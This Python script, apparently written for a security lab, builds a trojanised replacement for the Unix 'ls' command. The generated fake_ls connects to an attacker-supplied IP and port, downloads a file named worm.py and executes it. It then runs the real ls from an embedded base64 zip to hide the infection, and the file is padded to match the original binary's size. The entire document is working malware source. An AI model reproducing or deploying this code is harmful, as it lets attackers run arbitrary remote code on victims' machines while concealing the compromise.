#!/usr/bin/python3
import os, sys, base64
from zipfile import ZipFile

def zip_ls():
    os.system("zip -j /tmp/ls.zip /usr/bin/ls > /dev/null")
    with open("/tmp/ls.zip", "rb") as f:
        return f.read()
        

# build virus template, not used
def unzip_exec_ls():
    with ZipFile("/tmp/ls.zip", "r") as f:
        f.extractall("./")

    os.system("chmod +x ./ls")
    ret = os.system("./ls " + " ".join(sys.argv[1:]))

    os.system("rm ./ls")
    os.system("rm /tmp/ls.zip")

    if ret != 0:
        print("ls failed")
        exit(1)
    return ret


def build_virus(atkip: str, atkport: int, ls_zip: bytes):
    # base64 encode原因 因zip文件有不可print的字元，就會多出很多\x這個escape字元
    # 會變長太多，若用string，則因為每個byte要用兩個char表示，會變兩倍大
    # 若用base64，則只會變4/3倍大，但是所有字元都可以直接用string表示
    b64 = base64.b64encode(ls_zip)

    code = f"""#!/usr/bin/python3
import sys, os, socket, base64
from zipfile import ZipFile

ls_b64 = bytes({b64})

def get_worm(ip, pt):
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect((ip, pt))
    rcv_f = 'worm.py'
    with open(rcv_f, 'wb') as f:
        while True:
            data = skt.recv(1024)
            if not data:
                break
            f.write(data)
    skt.close()

def run():
    get_worm("{atkip}", {atkport})
    os.system("python3 worm.py && rm worm.py")

    orig_ls = base64.b64decode(ls_b64)
    with open("/tmp/ls.zip", 'wb') as f:
        f.write(orig_ls)
    with ZipFile("/tmp/ls.zip", "r") as f:
        f.extractall("/tmp/")
    os.system("rm /tmp/ls.zip && chmod +x /tmp/ls")
    ret = os.system("/tmp/ls "+" ".join(sys.argv[1:]))
    os.system("rm /tmp/ls")
    return ret
    
if __name__ == "__main__":
    run()
    """

    ls_size = os.path.getsize("/usr/bin/ls")
    with open("fake_ls", "wb") as f:
        f.write(code.encode())
    new_size = os.path.getsize("fake_ls")
    with open("fake_ls", "ab") as f: # append byte mode
        f.write(b'\x00' * (ls_size - new_size - 4))
        f.write(b'\xaa\xbb\xcc\xdd')
    # print("new size:", new_size)
    # print("original size:", ls_size)


# if __name__ == "__main__":
#     build_virus("172.18.0.2", 33333, zip_ls())
